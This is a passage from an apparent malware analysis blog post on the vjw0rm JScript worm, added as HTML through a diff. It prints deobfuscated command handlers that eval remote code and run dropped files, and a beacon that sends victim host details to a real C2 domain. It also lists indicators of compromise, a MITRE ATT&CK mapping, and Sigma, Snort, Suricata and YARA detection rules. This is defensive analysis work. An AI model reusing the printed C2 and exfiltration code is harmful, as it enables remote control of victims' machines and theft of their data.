+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">gu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">gu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gu</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;|U|&#39;</span>, <span style="color:#e6db74">&#39;|V|&#39;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ctf</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">gu</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">ctf</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;wscript.exe //B &#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Un&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">vdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">regi</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Nothing!&#39;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%f&#39;</span>, <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptFullName</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%n&#39;</span>, <span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">ScriptName</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%sfdr&#39;</span>, <span style="color:#a6e22e">vdr</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;%RgNe%&#39;</span>, <span style="color:#a6e22e">regi</span>);
+</span></span><span style="display:flex;"><span>			eval(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Quit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;RF&#39;</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;temp&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fi</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">CreateTextFile</span>(<span style="color:#a6e22e">s2</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Write</span>(<span style="color:#a6e22e">path</span>[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fi</span>.<span style="color:#a6e22e">Close</span>();
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">sh</span>.<span style="color:#a6e22e">run</span>(<span style="color:#a6e22e">s2</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p><em>Figure 9: Partially Deobfuscated C2 commands</em></p>
+<p>This section of the code required more work. I needed to make additional adjustments to the parameters here to determine the functionality of each command that could be sent to the victim machine.</p>
+<p>Moving down, I arrived at the C2 domain that was previously located through the base64 decoding exercise. Here, we can see all of the additional informaiton that is sent via the post requests to the C2. Key points:</p>
+<ul>
+<li>C2 domain has the <code>/vre</code> directory appended to it as per Figure 9</li>
+<li>We can determine the syntax of the data sent to the C2 from the infromation provided below</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">C2_Domain</span>(<span style="color:#a6e22e">C</span>, <span style="color:#a6e22e">A</span>) { <span style="color:#75715e">// Domain to send victim information
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">C2_Request</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;http://javaautorun.duia.ro:5465/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">path</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">SetRequestHeader</span>(<span style="color:#e6db74">&#39;User-Agent:&#39;</span>, <span style="color:#a6e22e">Info_Exfil</span>());
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">A</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">C2_Request</span>.<span style="color:#a6e22e">responsetext</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Info_Exfil</span>() { <span style="color:#75715e">// Check to see whether vbc.exe exists on disk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">victim_info</span>, <span style="color:#a6e22e">VBS_Exists</span>, <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">fileexists</span>(<span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;Windir&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&#39;</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;YES&#39;</span>;
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;NO&#39;</span>;
+</span></span><span style="display:flex;"><span>	}       <span style="color:#75715e">// Collect and post the following victim information to C2 address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">victim_info</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">campaign</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;COMPUTER_NAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Ex</span>(<span style="color:#e6db74">&#39;USER_NAME&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Sys_Info</span>(<span style="color:#a6e22e">GET_OS</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">Sys_Info</span>(<span style="color:#a6e22e">GET_AV</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">VBS_Exists</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">reg_key_exists</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">blackslash</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">victim_info</span>;
+</span></span></code></pre></div><p><em>Figure 10: C2 Domain and POST data syntax</em></p>
+<p>The User-Agent string is used to supply the C2 domain with information recovered from the victim machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /Vre <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">javaautorun.duia.ro:5465</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">[campaign_identifier]_[device_serial]\[computer_name]\[user_name]\[operating_system]\[anti_virus]\[vbc_exists]\[previously_infected]</span>
+</span></span></code></pre></div><p>Note: the values would reflect the actual data collected from the victim host</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>campaign_identifier</td>
+<td>Allows identification of the script that infected the endpoint. Can be renamed.</td>
+</tr>
+<tr>
+<td>computer_name</td>
+<td>Hostname of computer. Taken from the environment variables of the infected machine</td>
+</tr>
+<tr>
+<td>user_name</td>
+<td>Username that ran the script. Taken from the environment variables of the infected machine</td>
+</tr>
+<tr>
+<td>operating_system</td>
+<td>Returns the operating system version</td>
+</tr>
+<tr>
+<td>anti_virus</td>
+<td>Returns the name of the anti-virus running on infected system if any</td>
+</tr>
+<tr>
+<td>vbc_exists</td>
+<td>Checks for Visual Basic Compiler within the .NET Framework folder on disk</td>
+</tr>
+<tr>
+<td>previously_infected</td>
+<td>Checks for the presence of the vjw0rm registry key on the host</td>
+</tr>
+<tr>
+<td><em>Figure 11: Breakdown of User-Agent String values</em></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Figure 12 shows what data is transmitted to the C2 infrastructure through the POST request using dummy values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /Vre <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">javaautorun.duia.ro:5465</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">9\21_CED5691\USER-PC\Bob\Windows 10 20H2\undefined\YES\FALSE</span>
+</span></span></code></pre></div><p><em>Figure 12: HTTP Post with dummy values</em></p>
+<h3 class="relative group">Host Indicators 
+    <div id="host-indicators" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#host-indicators" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Analysis of the deobfuscated script reveals two key host artefacts that can be used to create signatures for this variant of vjw0rm and are key to successful remediation of the malware from the infected device.</p>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>vjw0rm</td>
+<td><code>HKCU\vjw0rm</code></td>
+</tr>
+</tbody>
+</table>
+<h3 class="relative group">Network Indicators 
+    <div id="network-indicators" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#network-indicators" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>As previously identified, this malware seems to call out to the domain <code>http://javaautorun.duia[.]ro:5465/</code></p>
+<p>We know that this is a malicious indicator, but worth running this through <a href="https://www.virustotal.com/gui/url/1671f610cadbe161c725159fd5303c3ee7dc489164036205019e1f47c1c74b9c"   target="_blank">
+    VirusTotal</a> to see whether there are any other reported community connections to the URL that might give us some additional indicators. The URL is flagged by a total of 15 AVs at the time of writing this blog. Additionally, it is outwardly listed as a bot network/command and control domain served by the IP address <code>41[.]190.14.132</code>. The IP address is once again confirmed by completion of a <a href="https://centralops.net/co/"   target="_blank">
+    centralops.net</a> domain search.</p>
+<table>
+<thead>
+<tr>
+<th>Network Indicator</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://javaautorun.duia[.]ro:5465/</code></td>
+<td>C2 Domain</td>
+</tr>
+<tr>
+<td><code>41[.]190.14.132</code></td>
+<td>IP Address of C2 <a href="https://www.virustotal.com/gui/url/1671f610cadbe161c725159fd5303c3ee7dc489164036205019e1f47c1c74b9c"   target="_blank">
+    (VirusTotal)</a></td>
+</tr>
+<tr>
+<td><code>41[.]217.29.212</code></td>
+<td>IP Address of C2 <a href="https://centralops.net/co/"   target="_blank">
+    (Centralops)</a></td>
+</tr>
+<tr>
+<td><em>Figure 11: C2 Domains and their respective IP Addresses</em></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 class="relative group">MITRE ATT&amp;CK 
+    <div id="mitre-attck" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#mitre-attck" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This section details the aspects of the MITRE ATT&amp;CK framework used by vjw0rm.</p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>ID</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Gather Victim Host Information</td>
+<td>T1592</td>
+<td>vjw0rm gathers information about the victim&rsquo;s host including Operating System, AntiVirus product, whether the victim has been infected previously and the presense of Visual Basic Compiler</td>
+</tr>
+<tr>
+<td>Phishing</td>
+<td>T1566</td>
+<td>the most popular form of infection occurs through phishing campaigns, where the user of the victim machine is unwittingly tricked into downloading a Microsoft Office document/spreadsheet or PDF containing the malicious code.</td>
+</tr>
+<tr>
+<td>Command and Scripting Inerpreter</td>
+<td>T1059</td>
+<td>vjw0rm is installed through running the malicious code via VBS. This allows vjw0rm to interact with the victim machine, checking and establishing persistence before beaconing back to the C2 domain with host details.</td>
+</tr>
+<tr>
+<td>Boot or Logon Autostart Execution</td>
+<td>T1547</td>
+<td>vjw0rm establishes persistence by adding the registry key <code>HKCU\vjw0rm</code> to the victim machine. This is the only form of persistence used by this type of malware.</td>
+</tr>
+<tr>
+<td>Application Layer Protocol</td>
+<td>T1071</td>
+<td>vjw0rm communicates using <code>HTTP 1.0</code> via port 5465 with the C2 server. Details of the victim machine are nested in the <code>User-Agent:</code> string of the HTTP header as a level of obfuscation.</td>
+</tr>
+<tr>
+<td>Exfiltration Over C2 Channgel</td>
+<td>T1041</td>
+<td>Victim machine information is harvested and transferred to the C2 server</td>
+</tr>
+</tbody>
+</table>
+<h2 class="relative group">Signatures 
+    <div id="signatures" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#signatures" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>This segment of the report aims to provide actionable signatures for the community to protect against vjw0rm. This section will be updated as I work through and test each of the signatures. I&rsquo;ll be writing a separate blog post that captures my signature creation process.</p>
+<p>To create these rules, I move out of the context of my virtual environment with a code program installed on my host machine. The reasoning behind this is, like for my notes, I don&rsquo;t want to lose the information that I capture from analysis through the reverting to a clean snapshot process.</p>
+<h3 class="relative group">SIGMA 
+    <div id="sigma" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sigma" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>SIGMA rules are another tool for sharing detections, focusing on integration into a SIEM. The idea is that these rules will enrich SIEM data, pulling out and alerting the SOC Analyst of malicious behaviours. The below rule targets the vjw0rm registry key that is queried by default in each interaction.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span><span style="color:#f92672">title</span>: <span style="color:#ae81ff">vjw0rm Registry Activity</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">status</span>: <span style="color:#ae81ff">test</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">description</span>: <span style="color:#ae81ff">Detects the registry key used by vjw0rm as a form of persistence</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">author</span>: <span style="color:#ae81ff">polaryse</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">date</span>: <span style="color:#ae81ff">2023</span><span style="color:#ae81ff">/01/22</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">modified</span>: <span style="color:#ae81ff">2023</span><span style="color:#ae81ff">/01/222</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">tags</span>:
+</span></span><span style="display:flex;"><span>	- <span style="color:#ae81ff">attack.persistence</span>
+</span></span><span style="display:flex;"><span>	- <span style="color:#ae81ff">attack.t1547.001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">logsource</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">category</span>: <span style="color:#ae81ff">registry_event</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">product</span>: <span style="color:#ae81ff">windows</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">detection</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">selection</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#f92672">TargetObject</span>: <span style="color:#e6db74">&#39;HKCU\vjw0rm&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">condition</span>: <span style="color:#ae81ff">selection</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">level</span>: <span style="color:#ae81ff">high</span>
+</span></span></code></pre></div><h3 class="relative group">Snort and Suricata 
+    <div id="snort-and-suricata" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#snort-and-suricata" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<h4 class="relative group">Snort 
+    <div id="snort" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#snort" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Snort is the most commonly known Open Source tool that identifies malicious network traffic. The rules created as part of this IPS are used to find packets that match against the known Indicators of Compromise (IOCs), generating an alert where said match is found.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http any any -&gt; 41.190.14.132 5465 (msg</span>: <span style="color:#e6db74">&#34;vjw0rm C2 contacted by endpoint&#34;</span><span style="color:#ae81ff">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http any any -&gt; 41.217.29.212 5465 (msg</span>: <span style="color:#e6db74">&#34;vjw0rm C2 contacted by endpoint&#34;</span><span style="color:#ae81ff">)</span>
+</span></span></code></pre></div><p>The problem with the above rules is that if the malware author moves or changes their C2 infrastructure, these rules will no longer fire. The better approach here is to write a rule specifically targeting the C2 domain address or better yet, target the User-Agent String portion of the http packet and match on information that is always sent to the C2 domain. Attempts to achieve this appear below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span><span style="color:#75715e"># blocking through host </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># not effective, they can just roll the domain name</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg</span>: <span style="color:#e6db74">&#34;MALWARE vjworm C2 contacted&#34;</span><span style="color:#f92672">; http_header</span>: <span style="color:#ae81ff">field; host; content:&#34;javaautorun.duia.ro&#34;;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># alerting through POST request to /Vre URI</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># better, but not amazing, what if the folder changes?</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg</span>: <span style="color:#e6db74">&#34;MALWARE vjworm C2 contacted&#34;</span><span style="color:#ae81ff">; flow:established,to_server; content:&#34;POST&#34;; nocase; http_method; uricontent:&#34;/Vre HTTP/1.1&#34;;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># alerting through identifying a pattern in the user-agent string</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># more robust, has ability to change, but the serial number is present in a lot of vjworm samples. </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># We might be safer here. </span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#34;MALWARE vjw0rm C2 contacted&#34;; content:&#34;POST&#34;; http_method; http.user_agent; content:&#34;_&#34;; depth:8; fast_pattern; pcre:&#34;/_[A-F0-9]{8}/V&#34;; reference:url, [https://polaryse.github.io/posts/vjw0rm/](https://polaryse.github.io/posts/vjw0rm/); classtype:trojan-activity; sid:1000000; rev:1;)</span>
+</span></span></code></pre></div><h4 class="relative group">Suricata 
+    <div id="suricata" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#suricata" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>Suricata rules are another method of Threat Intelligence sharing specifically for network traffic. like Snort, these rules are exceptionally pluggable. The following rule, as above, will alert on instances where an endpoint calls out to the Command and Controll domain identified during analysis of this malware.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span><span style="color:#75715e"># alerting on user-agent string </span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">alert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:&#34;MALWARE vjw0rm C2 contacted&#34;; content:&#34;POST&#34;; http_method; http.user_agent; content:&#34;_&#34;; depth:8; fast_pattern; pcre:&#34;/_[A-F0-9]{8}/V&#34;; reference:url, [https://polaryse.github.io/posts/vjw0rm/](https://polaryse.github.io/posts/vjw0rm/); classtype:trojan-activity; sid:1000000; rev:1;)</span>
+</span></span></code></pre></div><h3 class="relative group">YARA Signature 
+    <div id="yara-signature" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#yara-signature" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>YARA stands for &ldquo;Another Recursive Acronym&rdquo; or &ldquo;Yet Another Ridiculous Acronym&rdquo; which honestly, has always tickled me.</p>
+<p>I have always danced around the creation of YARA rules in my career. I&rsquo;ve read the documentation, dealt with constructed rules but never written one myself. Below is the first attempt at a YARA rule. I&rsquo;m sure that I will update this as I continue to gain familiarity with the best practice and structure of YARA. The documentation for YARA is pretty good too, and you can access it here <code>https://yara.readthedocs.io/en/stable/</code></p>
+<p>The following rule targets the deobfuscated components of the analysed vjworm sample to integrate into your YARA setup.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-YAML" data-lang="YAML"><span style="display:flex;"><span><span style="color:#ae81ff">rule vjworm_921_campaign</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#f92672">meta</span>: 
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">created = &#34;2022/11/29&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">modified = &#34;2022/12/01&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">author = &#34;polaryse&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">description = &#34;Simple YARA rule to detect the presence of vjworm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">strings</span>: 
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm_regkey = &#34;HKCU\\vjworm&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm_regkey_2 = &#34;HKCU\\vjw0rm&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm = &#34;vjworm&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm_2 = &#34;vjw0rm&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm_C2 = &#34;http://javaautorun.duia.ro&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">$vjworm_delimiter = &#34;|V|&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">condition</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">any of them</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 class="relative group">Lessons Learned in Analysis 
+    <div id="lessons-learned-in-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#lessons-learned-in-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Analysis of this sample taught me a lot about how I deal with frustration, which is not to say <em>well</em>. This was the first real world sample that have analysed and it really challenged my general knowledge about JavaScript.</p>
+<p>I beat my head against the wall more than once, and on something some would arguably call &ldquo;simple&rdquo;. I grumped and grumbled, beating myself up for not understanding immediately how to deobfuscate the second layer of this code. I sat there for hours, wasting time caught up in my frustration instead of doing something simple and logical.</p>
+<p>Walking away.</p>
+<p>The key take aways this taught me was whenever you are starting to feel your brows twist, your body hunch over the keyboard and more sighs and growls than you ever thought would come out of your mouth&hellip; start&hellip; just walk away. Set a timer for an hour, do what you can and then go for a good walk.</p>
